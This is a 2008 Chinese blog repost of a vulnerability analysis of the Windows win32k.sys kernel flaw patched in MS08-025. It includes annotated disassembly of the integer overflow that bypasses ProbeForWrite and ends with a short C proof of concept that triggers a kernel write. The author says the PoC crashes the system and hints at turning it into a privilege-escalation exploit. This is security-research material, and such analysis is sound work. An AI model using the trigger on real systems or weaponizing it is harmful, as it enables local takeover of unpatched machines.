---
title: ms08025 分析 Windows的内核漏洞
description: 4月8号microsoft再次发布了一个系统内核的补丁(KB941693),微软对该漏洞描述为:此安全更新解决Windows内核中一个秘密报告的漏洞。成功利用此漏洞的本地攻击者可以完全控制受影响的系统。攻击者可随后安装程序；查看、更改或删除数据；或者创建新帐户。这是用于Windows2000、WindowsXP、WindowsServer2003、WindowsVista和WindowsServer2008所有受支持版本的重要安全更新。此安全更新通过修改Windows内核验证从用户模式传递过来的输入的方式来解决此漏洞。从这个介绍中我们看到这个漏洞影响非常广，从2000到2008。为了能一睹这个漏洞的细节，我分析了ms08-025的补丁，发现该漏洞存在于win32k.sys模块中。在这个补丁中修补了win32k.sys中的多个地方，其中出问题的地方非常有趣，是因为溢出寄存器来绕过ProbeForWrite函数对用户层传来的指针的检查，下面我们就从NtUserfnOUTSTRING函数中的问题来展开我们的分析(我分析的平台是winxpsp2)
date: 2008-04-14 09:06:20
category: 漏洞信息
tags: ['0day', 'exploit', '漏洞信息', 'Windows']
post_id: 450
alias: ms08025-fenxi-windows-loudong
ViewNums: 5268
---

[夜火](/blog/)这**MS08025漏洞**的报告出来有段时间了，一直没看到比较详细的关于MS08025漏洞的东西，今天终于看到了[安全焦点](http://www.xfocus.net/)的关于MS08025漏洞的分析

From:安全焦点
Author: Polymorphours
Email: Polymorphours@whitecell.org
Homepage:[http://www.whitecell.org](http://www.whitecell.org/ "http://www.whitecell.org")
Date: 2008-04-10

经内部讨论后决定公布分析成果。

4月8号[microsoft](http://www.microsoft.com)再次发布了一个系统内核的补丁(KB941693),微软对该[漏洞描述](/tags/%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF)为: 此[安全](/tags/%E5%AE%89%E5%85%A8)更新解决 [Windows](/tags/Windows) 内核中一个秘密报告的漏洞。 成功利用此漏洞的本地攻击者可以完全控制受影响的系统。 攻击者可随后安装程序；查看、更改或删除数据；或者创建新帐户。这是用于 Windows 2000、Windows XP、Windows Server 2003、Windows Vista 和 Windows Server 2008 所有受支持版本的重要安全更新。此安全更新通过修改 Windows 内核验证从用户模式传递过来的输入的方式来解决此漏洞。

从这个介绍中我们看到这个漏洞影响非常广，从2000到2008。为了能一睹这个漏洞的细节，我分析了**ms08-025**的补丁，发现该漏洞存在于win32k.sys 模块中。在这个补丁中修补了win32k.sys中的多个地方，其中出问题的地方非常有趣，是因为[溢出](/blog/buffer-overflow-tutorial-ebook-iso-download)寄存器来绕过 ProbeForWrite函数对用户层传来的指针的检查，下面我们就从 NtUserfnOUTSTRING函数中的问题来展开我们的分析(我分析的平台是winxp sp2)

.text:BF86FB04 ; int __stdcall NtUserfnOUTSTRING(int,int,int,PVOID Address,int,int,int)
.text:BF86FB04 __stdcall NtUserfnOUTSTRING(x, x, x, x, x, x, x) proc near
.text:BF86FB04 ; CODE XREF: xxxDefWindowProc(x,x,x,x)+6Ep
.text:BF86FB04 ; NtUserMessageCall(x,x,x,x,x,x,x)+61p
.text:BF86FB04 ; xxxSendMessageToClient(x,x,x,x,x,x,x)-Ep
.text:BF86FB04 ; xxxSendMessageToClient(x,x,x,x,x,x,x)+6Dp
.text:BF86FB04 ; xxxWrapCallWindowProc(x,x,x,x,x)-4Bp
.text:BF86FB04 ; xxxWrapCallWindowProc(x,x,x,x,x)+60p ...
.text:BF86FB04
.text:BF86FB04 var_24 = dword ptr -24h
.text:BF86FB04 var_20 = dword ptr -20h
.text:BF86FB04 UserBuffer = dword ptr -1Ch
.text:BF86FB04 ms_exc = CPPEH_RECORD ptr -18h
.text:BF86FB04 arg_0 = dword ptr 8
.text:BF86FB04 arg_4 = dword ptr 0Ch
.text:BF86FB04 arg_8 = dword ptr 10h
.text:BF86FB04 Address = dword ptr 14h
.text:BF86FB04 arg_10 = dword ptr 18h
.text:BF86FB04 arg_14 = dword ptr 1Ch
.text:BF86FB04 arg_18 = dword ptr 20h
.text:BF86FB04
.text:BF86FB04 ; FUNCTION CHUNK AT .text:BF86FAE1 SIZE 0000001E BYTES
.text:BF86FB04
.text:BF86FB04 push 14h
.text:BF86FB06 push offset unk_BF98D250
.text:BF86FB0B call __SEH_prolog
.text:BF86FB0B
.text:BF86FB10 xor edx, edx
.text:BF86FB12 mov [ebp+ms_exc.disabled], edx
.text:BF86FB15 mov eax, [ebp+var_20]
.text:BF86FB18 mov ecx, 7FFFFFFFh
.text:BF86FB1D and eax, ecx
.text:BF86FB1F mov esi, [ebp+arg_18]
.text:BF86FB22 shl esi, 1Fh
.text:BF86FB25 or eax, esi
.text:BF86FB27 mov [ebp+var_20], eax
.text:BF86FB2A mov esi, eax
.text:BF86FB2C xor esi, [ebp+arg_8] -> esi = 缓冲区长度
.text:BF86FB2F and esi, ecx
.text:BF86FB31 xor eax, esi
.text:BF86FB33 mov [ebp+var_20], eax
.text:BF86FB36 cmp [ebp+arg_18], edx -> 如果是 ansi 方式就直接进行检查，否则需要计算unicode的大小
.text:BF86FB39 jnz short loc_BF86FB47
.text:BF86FB39
.text:BF86FB3B lea esi, [eax+eax] <- 注意这里，问题就在这里，此时 eax = unicode字符串的长度，
<- 当 eax = 0x80000000 的时候 eax + eax = 0x100000000，32位的寄存器
<- 被溢出了，esi = 0
.text:BF86FB3E xor esi, eax
.text:BF86FB40 and esi, ecx
.text:BF86FB42 xor eax, esi
.text:BF86FB44 mov [ebp+var_20], eax -> 保存unicode占用的空间大小
.text:BF86FB44
.text:BF86FB47
.text:BF86FB47 loc_BF86FB47: ; CODE XREF: NtUserfnOUTSTRING(x,x,x,x,x,x,x)+35j
.text:BF86FB47 mov [ebp+var_24], edx
.text:BF86FB4A mov esi, [ebp+Address]
.text:BF86FB4D mov [ebp+UserBuffer], esi
.text:BF86FB50 xor ebx, ebx
.text:BF86FB52 inc ebx
.text:BF86FB53 push ebx ; Alignment
.text:BF86FB54 and eax, ecx
.text:BF86FB56 push eax ; Length <- 由于 eax = 0，所以ProbeForWrite被绕过
.text:BF86FB57 push esi ; Address
.text:BF86FB58 call ds:ProbeForWrite(x,x,x)

bf80a1b0 e96ef4ffff jmp win32k!xxxRealDefWindowProc+0x1235 (bf809623)
bf80a1b5 d1e8 shr eax,1
bf80a1b7 894510 mov [ebp+0x10],eax
bf80a1ba ebf1 jmp win32k!xxxRealDefWindowProc+0x190 (bf80a1ad)
bf80a1bc 8b4514 mov eax,[ebp+0x14]
bf80a1bf f6400780 test byte ptr [eax+0x7],0x80
bf80a1c3 8b4008 mov eax,[eax+0x8]
bf80a1c6 7408 jz win32k!xxxRealDefWindowProc+0x105 (bf80a1d0)
bf80a1c8 c60000 mov byte ptr [eax],0x0
bf80a1cb e951f4ffff jmp win32k!xxxRealDefWindowProc+0x1225 (bf809621)
bf80a1d0 668910 mov [eax],dx <- 在这里，对前面传入的指针进行了2个字节的写操作，写入的数据为0
bf80a1d3 e949f4ffff jmp win32k!xxxRealDefWindowProc+0x1225 (bf809621)
bf80a1d8 6a00 push 0x0
bf80a1da 6a02 push 0x2
bf80a1dc ff7638 push dword ptr [esi+0x38]
bf80a1df e8d1690200 call win32k!BuildHwndList (bf830bb5)
bf80a1e4 8bf8 mov edi,eax
bf80a1e6 85ff test edi,edi
bf80a1e8 0f8433f4ffff je win32k!xxxRealDefWindowProc+0x1225 (bf809621)
bf80a1ee 8d7710 lea esi,[edi+0x10]

那么怎么触发这个漏洞呢，我又分析了 user32.dll 和 win32k!NtUserMessageCall，发现触发这个漏洞很简单，只需要调用 SendMessageW 发送WM_GETTEXT 消息就能够触发了，下面是poc代码(注，改代码运行后由于在内核写了未映射的内存，会直接蓝屏，要改成可用的[exploit](/tags/exploit)，可以参考我以前的exploit)

#include <stdio.h>
#include <windows.h>

int main(int argc,char *argv[])
{
DWORD dwHookAddress = 0x80000000;

printf( " MS08-025 Local Privilege Escalation Vulnerability Exploit(POC)
" );
printf( "Create by Whitecell's Polymorphours@whitecell.org 2008/04/10
" );

SendMessageW( GetDesktopWindow(), WM_GETTEXT, 0x80000000, dwHookAddress );
return 0;
}

WSS(Whitecell Security Systems)，一个非营利性民间技术组织，致力于各种系统安全技术的研究。坚持传统的hacker精神，追求技术的精纯。
WSS 主页：[http://www.whitecell.org/](http://www.whitecell.org/ "http://www.whitecell.org/")
WSS 论坛：[http://www.whitecell.org/forums/](http://www.whitecell.org/forums/ "http://www.whitecell.org/forums/")

